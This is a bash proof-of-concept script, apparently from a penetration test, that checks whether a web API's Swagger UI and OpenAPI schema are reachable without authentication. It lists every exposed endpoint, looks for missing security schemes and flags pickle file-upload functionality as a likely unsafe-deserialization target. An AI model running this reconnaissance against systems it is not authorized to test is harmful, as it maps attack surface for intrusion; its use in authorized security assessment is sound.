#!/bin/bash

# POC: Information Disclosure - Complete API Schema Exposed via OpenAPI/Swagger UI
# This script demonstrates unauthenticated access to the complete OpenAPI schema

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Information Disclosure - OpenAPI Schema Exposure POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Test 1: Check if /docs (Swagger UI) is accessible without authentication
echo "[*] Test 1: Checking Swagger UI accessibility at /docs"
DOCS_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/docs")
if [ "$DOCS_RESPONSE" = "200" ]; then
    echo "[+] SUCCESS: Swagger UI is accessible without authentication (HTTP $DOCS_RESPONSE)"
else
    echo "[-] Swagger UI returned HTTP $DOCS_RESPONSE"
fi
echo ""

# Test 2: Verify openapi.json endpoint accessibility
echo "[*] Test 2: Checking OpenAPI schema accessibility at /openapi.json"
SCHEMA_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/openapi.json")
if [ "$SCHEMA_RESPONSE" = "200" ]; then
    echo "[+] SUCCESS: OpenAPI schema is accessible without authentication (HTTP $SCHEMA_RESPONSE)"
else
    echo "[-] OpenAPI schema returned HTTP $SCHEMA_RESPONSE"
    exit 1
fi
echo ""

# Test 3: Retrieve and analyze the OpenAPI schema
echo "[*] Test 3: Retrieving complete OpenAPI schema"
SCHEMA_JSON=$(curl -s "${TARGET_URL}/openapi.json")

# Validate JSON
if echo "$SCHEMA_JSON" | jq . >/dev/null 2>&1; then
    echo "[+] SUCCESS: Valid JSON schema retrieved"
else
    echo "[-] Failed to parse schema as JSON"
    exit 1
fi
echo ""

# Test 4: Extract and display sensitive information from schema
echo "[*] Test 4: Analyzing schema for sensitive information"
echo ""

# Check for OpenAPI version
OPENAPI_VERSION=$(echo "$SCHEMA_JSON" | jq -r '.openapi' 2>/dev/null)
echo "[+] OpenAPI Version: $OPENAPI_VERSION"

# Check for server info
SERVER_URL=$(echo "$SCHEMA_JSON" | jq -r '.servers[0].url' 2>/dev/null)
if [ ! -z "$SERVER_URL" ] && [ "$SERVER_URL" != "null" ]; then
    echo "[+] Server URL from schema: $SERVER_URL"
fi

# Extract all paths/endpoints
ENDPOINTS=$(echo "$SCHEMA_JSON" | jq -r '.paths | keys[]' 2>/dev/null | sort)
echo "[+] Exposed Endpoints:"
if [ ! -z "$ENDPOINTS" ]; then
    echo "$ENDPOINTS" | sed 's/^/    /'
    ENDPOINT_COUNT=$(echo "$ENDPOINTS" | wc -l)
    echo "[+] Total endpoints exposed: $ENDPOINT_COUNT"
else
    echo "    (No endpoints found)"
fi
echo ""

# Check for pickle file upload vulnerability in schema
echo "[*] Test 5: Checking for pickle file upload endpoint in schema"
if echo "$SCHEMA_JSON" | jq . 2>/dev/null | grep -q "pickle"; then
    echo "[+] SUCCESS: Pickle-related functionality found in schema"
    echo "[+] This indicates potential unsafe deserialization vulnerability"
    # Extract pickle endpoint details
    PICKLE_INFO=$(echo "$SCHEMA_JSON" | jq '. | ..| objects | select(. | tostring | contains("pickle"))' 2>/dev/null)
    if [ ! -z "$PICKLE_INFO" ]; then
        echo "[+] Pickle endpoint details:"
        echo "$PICKLE_INFO" | jq . | sed 's/^/    /'
    fi
else
    echo "[!] Pickle endpoint not found in this schema"
fi
echo ""

# Test 6: Check for authentication requirements
echo "[*] Test 6: Checking for authentication/security schemes in schema"
SECURITY=$(echo "$SCHEMA_JSON" | jq '.securitySchemes' 2>/dev/null)
if [ "$SECURITY" = "null" ] || [ -z "$SECURITY" ]; then
    echo "[+] No security schemes defined - endpoints appear to be unauthenticated"
else
    echo "[!] Security schemes detected:"
    echo "$SECURITY" | jq . | sed 's/^/    /'
fi
echo ""

# Test 7: Check Swagger UI configuration
echo "[*] Test 7: Checking Swagger UI configuration from /docs"
DOCS_HTML=$(curl -s "${TARGET_URL}/docs")
if echo "$DOCS_HTML" | grep -q "deepLinking"; then
    echo "[+] deepLinking found in Swagger UI configuration"
fi
if echo "$DOCS_HTML" | grep -q "showExtensions"; then
    echo "[+] showExtensions found in Swagger UI configuration"
fi
if echo "$DOCS_HTML" | grep -q "SwaggerUIBundle"; then
    echo "[+] SwaggerUIBundle detected - interactive documentation enabled"
fi
echo ""

# Summary
echo "[*] ========== VULNERABILITY SUMMARY =========="
echo "[+] OpenAPI schema is publicly accessible without authentication"
echo "[+] Complete API endpoint structure is exposed"
echo "[+] Request/response schemas are visible to unauthenticated users"
if echo "$SCHEMA_JSON" | jq . 2>/dev/null | grep -q "pickle"; then
    echo "[+] Dangerous functionality (pickle upload) is documented in schema"
fi
echo "[+] This information can be used to identify and exploit API vulnerabilities"
echo "[*] =========================================="